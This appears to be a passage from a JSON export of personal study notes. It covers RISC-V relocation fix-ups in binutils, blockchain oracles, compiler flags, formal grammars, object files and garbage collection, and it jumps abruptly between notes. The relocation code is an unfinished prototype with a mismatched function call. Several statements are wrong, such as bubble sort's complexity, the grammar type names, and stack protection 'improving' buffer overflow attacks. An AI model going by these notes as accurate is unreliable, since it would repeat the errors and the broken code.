Then it gets checked and we set an **ID** for CORE-V (100):\n\n```c\nif (pretend_im_corevid \u0026\u0026 fixP-\u003efx_tcbit \u0026\u0026 fixP-\u003efx_addsy != NULL)\n{\nfixP-\u003efx_next = xmemdup (fixP, sizeof (*fixP), sizeof (*fixP));\nfixP-\u003efx_next-\u003efx_addsy = fixP-\u003efx_next-\u003efx_subsy = NULL;\n// CUSTOM RELOC\nfixP-\u003efx_next-\u003efx_r_type = BFD_RELOC_RISCV_RELOCID;\nfixP-\u003efx_next-\u003efx_size = 0;\n// ID\nfixP-\u003efx_next-\u003efx_offset = 100;\n}\n```\n\nWe then have a secondary howto table where the `special_function` is `riscv_elf_custom_relocid`, which should trigger `perform_relocation`. This function should handle the [relocation](notes/private/work/relocations.md) as you can see:\n\n```c\nstatic bfd_reloc_status_type\nriscv_elf_custom_relocid (bfd *abfd,\n       arelent *reloc_entry,\n       asymbol *symbol,\n       void *data,\n       asection *input_section,\n       bfd *output_bfd,\n       char **error_message ATTRIBUTE_UNUSED)\n       // do i need this?\n       //bfd_vma value)\n{\n  reloc_howto_type *howto = reloc_entry-\u003ehowto;\n  bfd_vma relocation;\n\n  if (output_bfd != NULL\n      \u0026\u0026 (symbol-\u003eflags \u0026 BSF_SECTION_SYM) == 0\n      \u0026\u0026 (!reloc_entry-\u003ehowto-\u003epartial_inplace || reloc_entry-\u003eaddend == 0))\n    {\n      reloc_entry-\u003eaddress += input_section-\u003eoutput_offset;\n            return bfd_reloc_ok;\n    }\n\n  if (output_bfd != NULL)\n    return bfd_reloc_continue;\n\n  relocation = symbol-\u003evalue + symbol-\u003esection-\u003eoutput_section-\u003evma\n    + symbol-\u003esection-\u003eoutput_offset + reloc_entry-\u003eaddend;\n  bfd_vma old_value = bfd_get (howto-\u003ebitsize, abfd,\n             data + reloc_entry-\u003eaddress);\n\n  switch (howto-\u003etype)\n    {\n    case R_RISCV_CVPCREL_UI12:\n      symbol-\u003evalue = ENCODE_CV_HWLP_UIMM5(symbol-\u003evalue \u003e\u003e howto-\u003erightshift);\n      break;\n    }\n  bfd_put (howto-\u003ebitsize, abfd, relocation, data + reloc_entry-\u003eaddress);\n\n  return bfd_reloc_ok;\n}\n```\n\nFinally in `bfd/elfnn-riscv.c` we have:\n\n```c\n/* Relocation handling prototype */\n    case R_RISCV_RELOCID:\n      switch (value) {\n        case 100:\n        //    ;\n          return riscv_elf_custom_relocid(ELFNN_R_TYPE (rel-\u003er_info));\n        //return get_howto_from_table(\u0026SECONDARYhowto_table, rel);\n        //return bfd_reloc_ok;\n        }\n        break;\n```\n\nWhich should link everything together, meaning it checks the ID in `R_RISCV_RELOCID` and calls the `perform_relocation` function, in our case `riscv_elf_custom_relocid`.

It stores information electronically in digital format. \n\nThey are best known for their role in cryptocurrency system, such as Bitcoin, for maintaining a secure and decentralised record of transactions.\n\nThe main difference between a typical database and a blockchain is how the data is structured. A **blockchain** collects information together in groups, known as **blocks**, that hold sets of information. They have certain storage capacities and, when filled, are closed and linked to the previous filled block, forming a **chain** of data known as the blockchain. A database usually structures its data into tables.\n\n## What is a Smart Contract?\nThey are computer programs that are hosted and executed on a blockchain network.\n\nEach smart contract consists of code specifying **predetermined** conditions that, when met, trigger outcomes. By running on a decentralised blockchain instead of a centralised server, smart contracts allow multiple parties to come to a shared result in an accurate, timely and **tamper-proof** manner.\n\nThey are a powerful infrastructure for automation because they are not controlled by a central administrator and are not vulnerable to single points of attack by malicious entities.\n\nOne smart contract can have multiple different conditions and one application can have multiple different smart contracts to support an interconnected set of processes. \n\nAn example of a contract language for programming is Ethereum's [Solidity](https://docs.soliditylang.org/en/v0.8.7/).\n\nAny developer can create a smart contract and deploy it on a public blockchain for their own purposes, e.g., a personal yield aggregator that automatically shifts their funds to the highest-earning application. However, many smart contracts involve multiple independent parties that may or may not know one another and don’t necessarily trust one another. \n\nThe smart contract defines exactly how users can interact with it, involving who can interact with the smart contract, at what times, and what inputs result in what outputs.  The result is multi-party digital agreements that evolve from today’s probabilistic state, where they will **probably** execute as desired, to a new deterministic state where they are **guaranteed** to execute according to their code.\n\n## What is an Oracle?\nA [blockchain oracle](https://blog.chain.link/oracles-the-key-to-unlocking-smart-contracts/) is any device or entity that connects a deterministic blockchain with off-chain data.\n\n![Screenshot 2022-07-01 at 09-53-33 What Is a Blockchain Oracle](notes/images/Screenshot%202022-07-01%20at%2009-53-33%20What%20Is%20a%20Blockchain%20Oracle.png)\n\nIf there is an API in the middle, the nodes could be interfered.\n\nIn blockchain, the mechanism for agreeing upon a data value is called [consensus](https://blockgeeks.com/guides/blockchain-consensus/), and determinism is important so that nodes can come to a consensus.\n\nOracles enter every data input through an external transaction. This way, we can be sure that the blockchain itself contains all of the information required to verify itself. This is why oracles are known as blockchain middleware: They are the bridge between the two worlds.\n\n![Screenshot 2022-07-01 at 09-55-17 What Is a Blockchain Oracle](notes/images/Screenshot%202022-07-01%20at%2009-55-17%20What%20Is%20a%20Blockchain%20Oracle.png)\n\n[The oracle problem](https://ethereum.stackexchange.com/a/84645/57451) is these two pieces combined:\n\n1.  Blockchains alone can’t access outside data.\n2.  Using centralised oracles nullifies the advantage of smart contracts — and are major security risks\n\n[Chainlink](https://chain.link/) solves both of these and is the standard for decentralised oracles.\n\n### What is a decentralised oracle?\nA [decentralised oracle](https://docs.chain.link/docs/architecture-decentralised-model) or decentralised oracle network is a group of independent blockchain oracles that provide data to a blockchain. Every independent node or oracle in the decentralised oracle network independently retrieves data from an off-chain source and brings it on-chain. The data is then aggregated so the system can come to a deterministic value of truth for that data point. Decentralised oracles solve the oracle problem.\n\nChainlink is a framework for choosing your independent network of nodes to connect the real world’s data to the blockchain to enable smart contracts to reach their true potential. With this, we are leveraging the same reliable decentralised infrastructure concept the blockchain has, but for blockchain oracles. If nodes/sources are hacked, depreciated, or deleted, the network of Chainlink will leverage the decentralised network and carry on.\n\n![decentralised Oracles are the solution to the Oracle Problem.](https://miro.medium.com/max/700/1*86phwklV3lpLzdz6Ob1gdg.png)\n\nThere are massive marketplaces leveraging the Chainlink technology to help you pick your network of independent nodes to pull your data from. This way, your smart contracts can easily never have a single point of failure.\n\nThe technology is blockchain agnostic and is constantly working to integrate with more blockchains so all blockchains can have access to reliable secure off-chain data. And best of all, the [documentation](https://docs.chain.link/docs) is great for beginner engineers and experienced alike.\n\nUsing one blockchain oracle is a huge risk and chainlink offers a fantastic new ecosystem around data. Blockchain oracles are the key to unlocking the future that smart contracts have for us. Oracles also provide a way for blockchains to see into each other. This is known as [interoperability](https://cointelegraph.com/explained/blockchain-interoperability-explained), and is an important next step as well.\n\n## Web3\nAn idea for a new World Wide Web which incorporates concepts such as decentralisation, using blockchain technologies for example.","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["help"]},"/notes/general/bubble-sort":{"title":"Bubble Sort","content":"# Bubble Sort\n---\nBubble sort is $O(n_2)$ meaning it is:\n- efficient if **n** is small.\n- efficient if the array is mostly sorted.\n\nIt is a **stable** sort.\n\nIt repeatedly compares adjacent parts of elements then swap the elements in part putting the smaller first.

The memory can be reallocated with **free** or **delete**.\n\n```c\n/* This is the definition of a uninitialized global variable */\nint x_global_uninit;\n\n/* This is the definition of a initialized global variable */\nint x_global_init = 1;\n\n/* This is the definition of a uninitialized global variable, albeit\n * one that can only be accessed by name in this C file */\nstatic int y_global_uninit;\n\n/* This is the definition of a initialized global variable, albeit\n * one that can only be accessed by name in this C file */\nstatic int y_global_init = 2;\n\n/* This is a declaration of a global variable that exists somewhere\n * else in the program */\nextern int z_global;\n\n/* This is a declaration of a function that exists somewhere else in\n * the program (you can add \"extern\" beforehand if you like, but it's\n * not needed) */\nint fn_a(int x, int y);\n\n/* This is a definition of a function, but because it is marked as\n * static, it can only be referred to by name in this C file alone */\nstatic int fn_b(int x)\n{\n  return x+1;\n}\n\n/* This is a definition of a function. */\n/* The function parameter counts as a local variable */\nint fn_c(int x_local)\n{\n  /* This is the definition of an uninitialized local variable */\n  int y_local_uninit;\n  /* This is the definition of an initialized local variable */\n  int y_local_init = 3;\n\n  /* Code that refers to local and global variables and other\n   * functions by name */\n  x_global_uninit = fn_a(x_local, x_global_init);\n  y_local_uninit = fn_a(x_local, y_local_init);\n  y_local_uninit += fn_b(z_global);\n  return (y_global_uninit + y_local_uninit);\n}\n```\n## Dissecting an Object File\nWe can use `nm` to look at the file above:\n\n```bash\nSymbols from c_parts.o:\n\nName                  Value   Class        Type         Size     Line  Section\n\nfn_a                |        |   U  |            NOTYPE|        |     |*UND*\nz_global            |        |   U  |            NOTYPE|        |     |*UND*\nfn_b                |00000000|   t  |              FUNC|00000009|     |.text\nx_global_init       |00000000|   D  |            OBJECT|00000004|     |.data\ny_global_uninit     |00000000|   b  |            OBJECT|00000004|     |.bss\nx_global_uninit     |00000004|   C  |            OBJECT|00000004|     |*COM*\ny_global_init       |00000004|   d  |            OBJECT|00000004|     |.data\nfn_c                |00000009|   T  |              FUNC|00000055|     |.text\n```\n\n- **U**: undefined reference.\n- **t** or **T**: indicates where code is defined, indicating whether the function is local to this file (**t**) or not (**T**) (`.text`).\n- **d** or **D**: initialised global variable, **d** meaning local and **D** global (`.data`).\n- **b** is for static/local **uninitialised** global variables, and **B** and **C** if it is not static/local (`.bss`).","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs"]},"/notes/general/chomsky-grammars":{"title":"Chomsky Grammars","content":"# Chomsky Grammars\n---\nType 0 (free) grammars:\n- Productions of the form u $\\rightarrow$ v, where:\n    - **u**, **v** are arbitrary string in **V**.\n    - **u** is non-null.\n\nType 1 (context-sensitive) grammars:\n- Productions of the form uXw $\\rightarrow$ uvw, where:\n- X $\\exists$ N\n- **u**, **v**, **w** are arbitrary strings in V.\n- v is non-null.\n\nType 2 (context-free) grammars:\n- Productions of the form X $\\rightarrow$ v, where:\n- X $\\exists$ N\n- v is an arbitrary string in V\n\nType 3 (regular or free) grammars:\n- Productions of the form X $\\rightarrow$ a or X $\\rightarrow$ aY, where:\n- X, Y $\\exists$ N\n- a $\\exists$ T\n\nAll **Type 2** grammars can be parsed, but there are some subsets, commonly used for programming language definition - which can be parsed particularly efficiently.\n\nAlthough **Type 3** grammars are not powerful enough for complete languages, they are widely used to define the lexical elements of a programming language.

There are many types of [compiler](notes/private/work/compilers.md) flags and there is no easy way to classify types of [compiler](notes/private/work/compilers.md) flags. But, for simplicity, we attempt to classify the flags to make it easier to understand different kinds of flags briefly:\n\n### Optimisation flags\nFlags like `-O2`, `-O3`, `-funroll-loops` can be classified as optimisation flags, as they provide the [compiler](notes/private/work/compilers.md) with what optimisations to perform.\n\n### Diagnostic flags\nFlags like `-Wall`, `-Werror`, `-Wnull-dereference` affect the diagnostic outputs by the [compiler](notes/private/work/compilers.md).\n\n### Tuning parameters\nFlags like `--param max-inline-insns-small=70` take different values, often numeric, to tune how much of a specific optimisation will be performed.\n    \n### Instrumentation flags\nFlags like `-finstrument-function`, `-profile-generate` enables [compiler](notes/private/work/compilers.md) instrumentation. The instrumented binary will collect runtime profiles that can help with optimisations, detecting bugs, etc.\n    \n### Linker flags\nFlags like `-lpthread`, which is a flag used by the linker to find symbol definitions, make optimisation decisions, etc.\n    \n### Value supplying flags\nFlags like `-D`, `-fprofile-use`, `-stdlib=libstdc++`, supply additional input to the [compiler](notes/private/work/compilers.md) that can help with optimisation, diagnostics, instrumentations, etc.\n\n## Optimising for Performance\n[Compilers](notes/private/work/compilers.md) offer various optimisations to improve performance and/or reduce code size. A set of [compiler](notes/private/work/compilers.md) optimisations are put together in umbrella [compiler](notes/private/work/compilers.md) flags referred to as ‘optimisation levels’. The following [compiler](notes/private/work/compilers.md) optimisation levels are common among most compilers:\n\n### -O0\nThis is the trivial case where no [compiler](notes/private/work/compilers.md) optimisation is performed. However, language-specific optimisations as mandated by the standard are still performed. For example, **compile-time** evaluations required by the C++ standard are still performed. This level is very useful for debugging purposes when combined with the `-g` [compiler](notes/private/work/compilers.md) flag. As `-O0` does not perform optimisations, **compile-time** is the fastest which is quite useful for iterative development.\n\n### -O1\nAt this level, many optimisations are enabled that improve the performance of the program. For example, loop unrolling, inlining, instruction scheduling, etc. This optimisation level is rarely used as more aggressive optimisation levels are available now.\n\n### -O2\nThis is one of the most popular optimisation levels. It enables all of `-O1` optimisations, as well as more aggressive optimisations in register allocation, instruction scheduling, partial redundancy elimination, etc. This level is used in building code dominated with branches, for example operating systems.\n\n### -O3\nThis level includes all of `-O2`, as well as some of the modern optimisations like vectorisation. `-O3` is the de facto optimisation level for maximising the performance of most applications. `-O3` is also used for benchmarking purposes, as it will have all the ‘battle-tested’ [compiler](notes/private/work/compilers.md) optimisations.\n\n### -Ofast\nThis is simply `-O3` with `-ffast-math`. The `-ffast-math` flag tells the [compiler](notes/private/work/compilers.md) to relax some requirements of floating-point arithmetic, like associativity and commutativity. In many applications, the errors introduced after relaxing this requirement are tolerable at the benefit of higher performance. Without `-ffast-math`, many loops with floating-point operations can’t be vectorised.\n\n### -Os\n`-Os` optimises for **code size**. So, most of the optimisations that increase code size will be less aggressive at this level. This is a popular optimisation among embedded systems and mobile applications, as code size is a big concern there.\n\n### -g\nTo be able to debug an application with source code annotations, the [compiler](notes/private/work/compilers.md) needs to provide additional information in the binary. The `-g` flag tells the [compiler](notes/private/work/compilers.md) to do that. Without this flag, the debugger will only show global symbol names and the disassembly, as it cannot associate a source line of code with the assembly.\n\n### -Og\nThis enables debugging capabilities just like `-g`, but it also enables some [compiler](notes/private/work/compilers.md) optimisations that benefit debugging, as opposed to `-O0`. So instead of `-O0 -g`, it is preferable to use `-Og`. Because `-Og` enables some optimisations, the application under test runs faster than `-O0`, so the turnaround time for testing may be better with it.\n\n### -finstrument-functions\nThis flag is used to instrument the entry and exit of functions. Instrumentation allows us to get insights into the behaviour of programs. While using this flag, we also need to define two functions `__cyg_profile_func_enter` and `__cyg_profile_func_exit`, which are called respectively at the entry and exit of each function invocation. If there are functions that should not be instrumented, `__attribute__((no_instrument_function))` can be added to them.\n\n### -fprofile-generate, -fprofile-arcs, -pg\nThese flags are used in order to instrument programs to collect runtime profiles of different program points. This allows the [compiler](notes/private/work/compilers.md) to do profile-guided optimisations in subsequent compilations. Depending on which flags you use, different types of instrumentation can be achieved. For a detailed overview of various flags see the [1) - Linux manual page](https://man7.org/linux/man-pages/man1/gcc.1.html|gcc(1)).\n\n### -fstack-protector, -fstack-protector-all, -fstack-protector-strong\nThese options instrument vulnerable functions by inserting guard variables onto its stack frame. Before the function returns, the guard variable is checked to make sure it wasn’t overwritten, thus making sure the stack wasn’t corrupted. \n\nThis is a trivial way to improve buffer overflow attacks. This however may increase the code size of the application. In case this creates an overhead, you may only want to compile security-critical parts of the application with this [compiler](notes/private/work/compilers.md) flag. More details about how to use this flag can be found [here](https://www.keil.com/support/man/docs/armclang_ref/armclang_ref_cjh1548250046139.htm).\n\n## Optimisation for Code Size Reduction\nHere are the most common compiler optimisations that can reduce a fair amount of binary size. All the flags mentioned here are widely used in the industry.\n\n- `-Os`: Explained [](notes/general/compiler-flags.md#-Os%7Chere).\n- `-Wl`,`--strip-all` (Or do not pass the `-g` flag): This flag tells the linker to remove the debug section.\n- `-fno-unroll-loops`: Disable loop unrolling, which is one of the popular compiler optimisations for performance and it increases code size.\n- `-fno-exceptions`: Removes exception handling code from the binary. Note that this is not always possible if there is code that ‘throws’.\n- `lto (-flto)`: Enabling link-time optimisations with `-flto` results in aggressive compiler optimisations. Many functions and global variables get optimised away, many call sites get de-virtualised. The resulting binary is faster and smaller at the same time. There could be significant compile-time overheads.","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs/compilers"]},"/notes/general/compiler-instrumentation":{"title":"Compiler Instrumentation","content":"# Compiler Instrumentation\n---\nAs the [compiler](notes/private/work/compilers.md) transforms the source code, it can also 'insert' additional code into a program. These transformations are called [compiler](notes/private/work/compilers.md) instrumentation. There are many uses of [compiler](notes/private/work/compilers.md) instrumentation, one of the common purposes is to collect the 'runtime profile' of a program. \n\nTo collect the runtime profile, a [compiler](notes/private/work/compilers.md) would insert 'counters' at certain parts of the program and those counters would increment every time the program execution reaches the site of instrumentation. \n\nAfter the program is finished, the counters can be used to understand the performance profile. The hottest parts of the program are most interesting to performance engineers.\n\n## Using Compiler Instrumentation\nCompilers can insert ‘counters’ at interesting program points to collect runtime profiles. The code is instrumented by passing `-fprofile-generate` to the compiler.\n\n```bash\n$ gcc -O2 -fprofile-generate=/path/to/outputfile test.c -o a.out\n```\n\nBecause of instrumentation, the application itself will then log events/counters that can be used by the compiler during the next compilation. After the program exits, it will create a file in the `/path/to/outputfile/` directory with `.gcda` extension. Then recompiling the application with `-fprofile-use=/path/to/outputfile` will result in an optimised program.\n\n```bash\n$ gcc -O2 -fprofile-use=/path/to/outputfile test.c -o b.out\n```\n\n`b.out` is optimised with profile information. The compiler often optimises the code layout, function inlining, and loops with profile information. It is common to see performance improvements of over 10% with PGO (Profile-Guided Optimisation).","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs/compilers"]},"/notes/general/coursera-intro-to-embedded-systems-week1":{"title":"Intro to Embedded Systems Software and Development Environments - Week 1","content":"---\n","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["course"]},"/notes/general/cross-compilation":{"title":"Cross-Compilation","content":"# Cross-Compilation\n---\nTo understand the concept of cross-compilation, let’s revisit the definition of a [compiler](notes/private/work/compilers.md). A [compiler](notes/private/work/compilers.md) is a program that converts a program from one language to another. But the word 'compiler' is often used to refer to a program that translates a program to a machine language to create an executable that runs on a computing device. Commonly, a [compiler](notes/private/work/compilers.md) is used to generate machine code for the same machine that the [compiler](notes/private/work/compilers.md) itself is running. By the same machine, we mean the same architecture. For example, a [compiler](notes/private/work/compilers.md) running on a linux-x64 machine compiling a C++ program and generating machine code for the same linux-x64 machine. This program can run on all linux-x64 machines, as long as a similar environment is provided.\n\nHowever, there are situations where we want to generate binaries for a machine type other than the [compiler](notes/private/work/compilers.md) it is running on. For example, if the target machine is not powerful enough. This is often the case while generating binaries for embedded devices, mobile apps, etc. A cross-compiler generates binaries that will run on a different machine (target machine) than the one where the [compiler](notes/private/work/compilers.md) itself is running (the host machine). This is a slightly complicated process, as it requires all the dependencies of the target machine to be present on the host machine.\n\nAs an example, when compiling a simple `hello-world` program for a host machine, the `stdio.h` header file in place like `/usr/include/stdio.h` is used. For generating a cross-compiled `hello-world` program, the `stdio.h` will be found in a different [sysroot](notes/private/work/sysroot.md). So, the [compiler](notes/private/work/compilers.md) invocation may look like:\n\n```bash\ngcc --sysroot=/path/to/aarch64/sysroot -march=armv8-a hello.c\n```\n\nAn even more convoluted setup is the [](https://en.wikipedia.org/wiki/Cross_compiler#Canadian_Cross), where there are two cross-compilers involved. In this setup, there are three machines A, B, and C. The cross-compiler in A (CA) will generate another cross-compiler (CB) that will run on B. CB will generate code for machine C.","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs/compilers"]},"/notes/general/cs-problems":{"title":"CS Problems","content":"# CS Problems\n---\n- [P vs NP problem.](notes/general/p-vs-np.md)\n- K-clique in a graph.\n- Boolean satisfiability.\n- Travelling Salesman problem.\n- Knapsack problem.\n- [Linear Knapsack Problem.](notes/general/linear-knapsack-problem.md)\n- Optimise branches and short branches.\n- Colour vertices of graph with k colours.\n- [Halting Problem](notes/general/halting-problem.md)\n\n## Harder Problems\n- Ackermann's function.\n- Does a regular expression cover all regular expressions possible for its alphabet.","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["work/engineer-training","cs"]},"/notes/general/dotfile-management":{"title":"Dotfile Management","content":"# Dotfile Management\n---\nMy dotfiles can be found on [GitHub](https://github.com/pietraferreira/dotfiles).\n\nJust type `config` anywhere, for example `config status` to manage the repo.\n\n## Resources\n* [Dotfiles management](https://www.ackama.com/what-we-think/the-best-way-to-store-your-dotfiles-a-bare-git-repository-explained/)","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["help"]},"/notes/general/embedded-applications":{"title":"Embedded Applications","content":"# Embedded Applications\n---\nThe definition and use case of embedded systems have evolved over time. While embedded systems are used to denote computing systems performing very specific tasks, it is no longer the case in many situations. Although most embedded systems are designed to perform a limited set of tasks, depending on the application, the tasks themselves may be simple or quite complex. \n\nEmbedded systems may have simple microcontrollers, or complex Digital Signal Processors (DSPs), or even microprocessors. Even with substantial variabilities across systems, few things are generally true for all:\n\n-   They are low-powered or battery-operated devices.\n-   They have limited storage.\n-   They do not upgrade the applications frequently.\n\nThere might be other things, but these three are a good starting point to understand how we can optimise these applications using compiler techniques.\n\n## Optimising for Power\nIn order to reduce the power consumed while the application is running, there are two schools of thought:\n\n- Execute/Design instructions that are low-powered\n- Execute instructions as fast as possible and go to idle mode.\n\nEach approach has its pros and cons.\n\n### Execute/Design instructions that are low-powered\nA processor has many instructions that can achieve the same computation. Each type of instruction consumes different amounts of system resources and is suitable for specific cases. For example, a floating-point operation may be more expensive than integer operations. In several embedded hardware, floating-point units aren’t present to begin with, and they use software routines to perform in case any floating-point operations arise in rare cases.\n\nCompilers, to the best of our knowledge, do not have a direct way to select only low-power consuming instructions. As a result, this approach is mostly applicable for hardware engineers. In limited situations, compiler engineers can take advantage of this approach when they have better insight into the processor and running applications; for example, vectorisation can be disabled as vector units often consume more power than scalar instructions.\n\nThere are also situations where a system can have [big+little configuration](https://www.arm.com/why-arm/technologies/big-little). The more powerful processors are only used when the demand for compute increases, otherwise computations are performed on low-power processors. If we can compile compute-heavy parts of the code for powerful processors ([`-mtune` flag](https://gcc.gnu.org/onlinedocs/gcc/ARM-Options.html)) and rest for the low-power processor, we can take advantage of this feature. This strategy will require regular updates to build flags combined with profile-guided optimisation.\n\n### Execute instructions as fast as possible and go to idle mode\nSome processors can have advanced [dynamic voltage and frequency scaling](https://en.wikipedia.org/wiki/Dynamic_frequency_scaling) capabilities. So, whenever there is no work to do, processors go into low-power idle mode. As a result, it makes sense to run applications as fast as possible and defer the responsibility of power management to the processor. To run the application as fast as possible, we can use higher optimisation levels like `-O3`, `-Ofast`; we can combine that with link time optimisations and profile guided optimisation to achieve even better performance.\n\n## Optimising for Binary Size\nCheck out [](notes/private/work/compiler-optimisation.md#Optimising%20Programs%20for%20Code%20Size|Optimising%20for%20Code%20Size).\n\n## References\n- [RISC-V Toolchain and Compiler Optimization Techniques](https://learning.edx.org/course/course-v1:LinuxFoundationX+LFD113x+3T2021/home)\n- [Aditya Kumar - Code Size Compiler Optimizations and Techniques for Embedded Systems](https://www.youtube.com/watch?v=6IuDWfuMEno)\n- [Aditya Kumar \u0026 Sebastian Pop - Performance analysis and optimization of C++ standard libraries](https://www.youtube.com/watch?v=OTCp_AkAyRQ)\n- [Visual Studio Developer Community - pragma optimize off is not working as expected](https://developercommunity.visualstudio.com/t/192628900-pragma-optimize-off-is-not-working-as-ex/1091452)\n- [nm(1) - Linux man page](1)%20-%20Linux%20man%20page)\n- [GCC Instrument functions](https://hacktalks.blogspot.com/2013/08/gcc-instrument-functions.html)\n- [Nitin Kumar - Profile-guided optimization (PGO) using GCC on IBM AIX](PGO)%20using%20GCC%20on%20IBM%20AIX)\n- [Aditya Kumar - Performance analysis and optimization](https://developercommunity.visualstudio.com/t/192628900-pragma-optimize-off-is-not-working-as-ex/1091452)\n- [Vinodha Ramasamy, Paul Yuan, Dehao Chen, Robert Hundt - Feedback-Directed Optimizations in GCC with Estimated Edge Profiles from Hardware Event Sampling](https://research.google/pubs/pub36576/)\n","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs"]},"/notes/general/equivalent-grammars":{"title":"Equivalent Grammars","content":"# Equivalent Grammars\n---\nEquivalent grammars define the same language:\n\n- G\nA $\\rightarrow$ Ax | y\n\n- G'\nA $\\rightarrow$ yB\nB $\\rightarrow$ yB | $\\varepsilon$\n\n- L(G) = L(G')\n\nOne grammar may be easier to parse than the other. \n\nNote however that they have very different parse [trees](notes/university/year2/cs2004/trees.md), and if the parse tree reflects the semantic structure for the language then the semantic information is lost.\n\nParse tree for yxx:\n![parse-tree-leftmost-rightmost](notes/images/parse-tree-leftmost-rightmost.png)\n\n## See Also\n- [Formal Languages](notes/general/formal-languages.md)\n","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs","work/engineer-training"]},"/notes/general/fixups":{"title":"Fixups","content":"# Fix-ups\n---\nFix-ups are used to represent information in instructions which is currently\nunknown.

They are description of languages that provide a mean for generating all possible strings contained in the language.\n\nA **sentence** is a string of symbols in T derived from S using one or more applications of productions in P.\n\nThe **language**, L(G) defined by a grammar, G, is the set of sentences derivable using G.\n\n## Context-Free Grammar (CFG)\nEach production has the form A $\\rightarrow$ w, where A is a **nonterminal** and w is a string of terminals and nonterminals.  Informally, a CFG is a grammar where any nonterminal can be expanded out to any of its productions at any point. The language of a grammar is the set of strings of terminals that can be derived from the start symbol.\n\nA **context-free grammar** (CFG) consists of:\n1.  A set of _terminals_ (tokens produced by the lexer).\n2.  A set of _nonterminals_.\n3.  A set of _productions_ (rules for transforming nonterminals). These are written  \n        LHS → RHS  \n    where the LHS is a **single** nonterminal (that is why this grammar is **context-free**) and the RHS is a string containing nonterminals and/or terminals.\n4.  A specific nonterminal designated as start symbol.\n\n## Context-Sensitive Grammar (CSG)\nEach production has the form wAx $\\rightarrow$ wyx, where w and x are strings of terminals and nonterminals and y is also a string of terminals. In other words, the productions give rules saying \"if you see A **in a given context**, you may replace A by the string y.\" It's an unfortunate that these grammars are called \"context-sensitive grammars\" because it means that \"context-free\" and \"context-sensitive\" are not opposites, and it means that there are certain classes of grammars that arguably take a lot of contextual information into account but aren't formally considered to be context-sensitive.\n\nTo determine whether a string is contained in a CFG or a CSG, there are many approaches. First, you could build a recogniser for the given grammar. For CFGs, the _[pushdown automaton](http://en.wikipedia.org/wiki/Pushdown_automaton)_ (PDA) is a type of automaton that accepts precisely the context-free languages, and there is a simple construction for turning any CFG into a PDA. For the context-sensitive grammars, the automaton you would use is called a _[linear bounded automaton](http://en.wikipedia.org/wiki/Linear_bounded_automaton)_ (LBA).\n\nMore info [here](https://stackoverflow.com/questions/8236422/context-free-grammars-versus-context-sensitive-grammars).\n## Derivation\n- Productions (Backus-Naur Form, BNF):\n\n$A \\rightarrow B_1, B_2, B_3, ..., B_n$\n\nassign_stmnt $\\rightarrow$ variable := expression\n\nassign_stmnt := variable ':=' expression\n\n- Sentence symbol at the top of the grammar:\n\n$S\\rightarrow A_1, A_2, A_3, ..., A_n$\n\n- Alternative definitions of a symbol:\n\n$A\\rightarrow B_1, B_2, B_3, ..., B_n$\n\n$A\\rightarrow C_1, C_2, C_3, ..., C_n$\n\n$A\\rightarrow B_1, B_2, B_3, ..., B_n | C_1, C_2, C_3, ..., C_n$\n\n- Self-referential (recursive productions):\n\n$A \\rightarrow A\\ x | y$\n\n- Empty production:\n\n$A \\rightarrow B\\ |\\ \\varepsilon$\n\n### Another Example\n```\nTerminals: 0 1 2 3 4 5 6 7 8 9 + -\n    Nonterminals: list digit\n    Productions:\n        list → list + digit\n        list → list - digit\n        list → digit\n        digit → 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9\n    Start symbol: list\n```\n\nWatch how we can generate the string 7+4-5 beginning with the start symbol, applying productions, and stopping when no productions can be applied (because only terminals remain).\n\n```\n    list → list - digit\n         → list - 5\n         → list + digit - 5\n         → list + 4 - 5\n         → digit + 4 - 5\n         → 7 + 4 - 5s\n```\n\n## Recursive Productions\nRecursive productions are defined in terms of themselves:\n\nvarlist $\\rightarrow$ variable | varlist, variable\n\nif one of the alternatives contains the recursion at its **leftmost end**, the production is called **left recursive**:\n\nA $\\rightarrow$ u | Av\n\nWhere A $\\exists$ N and u, v are arbitrary strings in V.\n\nWe also have **right recursive** productions:\n\nA $\\rightarrow$ u | vA\n\nLeft recursion in particular can be problematic.\n\n## Attribute Types\nValues of attributes of items on the LHS of productions derived from values of attributes on the RHS are known as **synthesised** attributes:\n\nX $\\rightarrow$ $Y_1, Y_2, ..., Y_n$\n\nEach semantic rule can be written as:\n\nX.a = f($Y_1$.a, $Y_2$.a, ..., $Y_n$.a)\n\nWe can also have **inherited attributes**, where values of attributes on the RHS are derived from values of attributes on both the LHS and RHS.\n\n## Types of Attribute Grammars\n**S-attributed** grammars only use synthesised attributes, can evaluate correctly by a bottom-up walk over the parse tree.\n\n**L-attributed** grammars have inherited attributes in which all inherited attributes are only functions of symbols to their left in the production. They can be evaluated by left-to-right depth first traversal of the parse tree.\n\n## See Also\n- [Compilers](notes/private/work/compilers.md)\n- [Trees](notes/university/year2/cs2004/trees.md)\n","lastmodified":"2023-09-12T17:33:55.017934619Z","tags":["cs","work/engineer-training"]},"/notes/general/garbage-collection":{"title":"Garbage Collection","content":"# Garbage Collection\n---\nHow do you reuse memory in a program?\n\nExplicit allocation and free: `malloc`/`free` (C), `new`/`delete` (C++).\n\nIt traces garbage collection and does reference counting.\n\n**Reach-ability**: reference directly or indirectly by one or more variables.\n    - Global variables.\n    - Stack variables.\n\n## Syntactic and Semantic Garbage\n```c\nclass Foo;\nclass Bar;\n\nmain ()\n{\n  Foo *x = new Foo ();\n  Bar *y = new Bar ();\n  x = new Foo ();\n  // The old Foo object assigned to x can never be accessed\n  // x is syntactic garbage\n  if (x.checkit ())\n    x.doit (y);\n  else\n    x.dontdoit ();\n  // In the above, whether y is garbage depends on the result\n  // of x.checkit (). y could be semantic garbage\n\n  exit (EXIT_SUCCESS);\n}\n```\n\n## Tracing\n### Mark and Sweep\nNaive mark-and-sweep.

